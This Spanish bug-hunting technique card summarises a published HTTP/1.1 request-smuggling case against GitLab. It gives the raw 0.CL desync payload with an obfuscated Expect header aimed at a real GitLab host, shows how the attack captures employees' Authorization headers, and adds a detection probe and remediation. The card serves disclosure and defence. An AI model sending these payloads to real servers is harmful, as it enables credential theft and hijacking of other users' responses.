---
clase: protocolo
tech: gitlab
cwe: CWE-444
cvss: 8.8 # [derivado] sin CVE en la fuente; estimado por captura de sesiones autenticadas de empleados
payload: |
  # NOTA DE PROCEDENCIA (H1): estructura por lineas RECONSTRUIDA desde el render
  # colapsado. Host literal de la fuente: h1.sec.gitlab.net (NO redactado).
  # La prosa de la fuente cita la cabecera ofuscada como: 'Expect: y 100-continue'
  GET / HTTP/1.1
  Content-Length: 686
  Expect: y 100-continue

  # Respuesta: HTTP/1.1 200 OK
  #
  # Cuerpo interpretado como peticiones nuevas:
  GET / HTTP/1.1
  Content-Length: 292

  GET / HTTP/1.1
  Host: h1.sec.gitlab.net

  GET / HTTP/1.1
  Host: h1.sec.gitlab.net

  # Respuesta: HTTP/1.1 200 OK
  #
  # Peticion CAPTURADA de un empleado (lo que ve el atacante):
  #   GET /??? HTTP/1.1
  #   Authorization: ???
  #   User-Agent: Unknown Gitlab employee
  #   -> HTTP/1.1 200 OK
  #
  # Y la victima recibe la respuesta desplazada:
  #   GET / HTTP/1.1
  #   Host: h1.sec.gitlab.net
  #   -> HTTP/1.1 302 Found
  #      Location: https://storage<...>
precondicion: "Cabecera Expect LIGERAMENTE OFUSCADA (token extra antes del valor, p.ej. 'Expect: y 100-continue') que el front-end acepta y el back-end interpreta distinto. Para que el Response Queue Poisoning alcance a una victima hace falta trafico concurrente: la fuente advierte que RQP 'is tricky on low-traffic targets due to an inherent race condition' y que el equipo envio del orden de 27,000 peticiones."
como_se_descubre: |
  Señal en recon: el objetivo ignora `Expect: 100-continue` valido (no desync), pero
  cambia de comportamiento con una variante ofuscada. La sonda es diferencial: probar
  `Expect: 100-continue` y despues `Expect: y 100-continue` y comparar status y
  temporizacion. Si la forma ofuscada produce respuesta inmediata donde la valida
  bloquea (o viceversa), hay discrepancia de parser explotable.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: peticion con 'Expect: y 100-continue' (ofuscada)  -> desync observable
  # B: peticion identica con 'Expect: 100-continue' (valida) -> sin desync
  # El par A/B es el control: aisla la OFUSCACION como causa, no la cabecera Expect
  # en si. Si B tambien desincroniza, el caso es el de T-Mobile (Expect vanilla),
  # no este. Clasificarlo bien cambia la remediacion que se recomienda.
mata: |
  - Front-end y back-end parsean Expect igual -> sin discrepancia, muere.
  - El front-end rechaza con 400 cualquier Expect no exactamente '100-continue'.
  - Trafico demasiado bajo: la race de RQP no se gana y no hay victima alcanzable.
  - Conexiones upstream no compartidas entre usuarios.
fuente: "https://portswigger.net/research/http1-must-die (James Kettle, 2025-08-06), seccion '0.CL desync via obfuscated Expect - Gitlab'. Recompensa citada: $7,000. Investigadores acreditados en el articulo: Paolo 'sw33tLie' Arnolfo, Guillermo 'bsysop' Gregorio, Mariani 'Medusa' Francesco."
confianza: media
fecha: 2026-11-02
---
# [PROTOCOLO] 0.CL desync con Expect ofuscado en GitLab — Response Queue Poisoning que captura peticiones autenticadas de empleados

## Principio
Un objetivo puede estar inmune a `Expect: 100-continue` válido y seguir siendo
vulnerable a una variante ofuscada. Lo que importa no es la cabecera, sino que los dos
parsers del camino discrepen sobre ella: basta un token extra (`Expect: y 100-continue`)
para que uno la considere válida y el otro no.

## Payload
```http
GET / HTTP/1.1
Content-Length: 686
Expect: y 100-continue
```

→ `HTTP/1.1 200 OK`

El cuerpo, que el front-end deja de esperar, contiene:

```http
GET / HTTP/1.1
Content-Length: 292

GET / HTTP/1.1
Host: h1.sec.gitlab.net

GET / HTTP/1.1
Host: h1.sec.gitlab.net
```

→ `HTTP/1.1 200 OK`

Con la cola de respuestas desplazada, el atacante empieza a recibir peticiones de
otros usuarios. La fuente muestra lo capturado:

```http
GET /??? HTTP/1.1
Authorization: ???
User-Agent: Unknown Gitlab employee
```

Y la víctima, en su lugar, recibe una respuesta que no le corresponde:

```http
HTTP/1.1 302 Found
Location: https://storage<...>
```

## Impacto
Response Queue Poisoning: el atacante lee peticiones ajenas **incluida la cabecera
`Authorization`**. Sobre un host de seguridad interno de GitLab, eso significa capturar
tokens de empleados — credenciales con privilegios sobre infraestructura, no sesiones
de usuario final. El atacante no necesita adivinar nada: espera y cosecha. Recompensa
pagada: $7.000.

## Remediación
El front-end debe tratar como error cualquier `Expect` que no sea exactamente
`100-continue` y responder `400`, en lugar de reenviarlo a un back-end con otro parser.
`# [derivado]`: lo decisivo es que un único componente decida la semántica de `Expect`;
mientras dos parsers distintos la evalúen sobre la misma conexión, la ofuscación
seguirá encontrando hueco. La fuente recomienda para toda la clase migrar el salto
upstream a HTTP/2.

## Nota operativa
RQP depende de una race con el tráfico real. La fuente es explícita: en objetivos de
poco tráfico es difícil, y aquí hicieron falta ~27.000 peticiones. Como criterio de
caza, esto significa que un desync confirmado en un objetivo silencioso no es un
hallazgo menor: es el mismo fallo sin ventana práctica, y conviene reportarlo por la
discrepancia de parser, no por la explotación lograda.
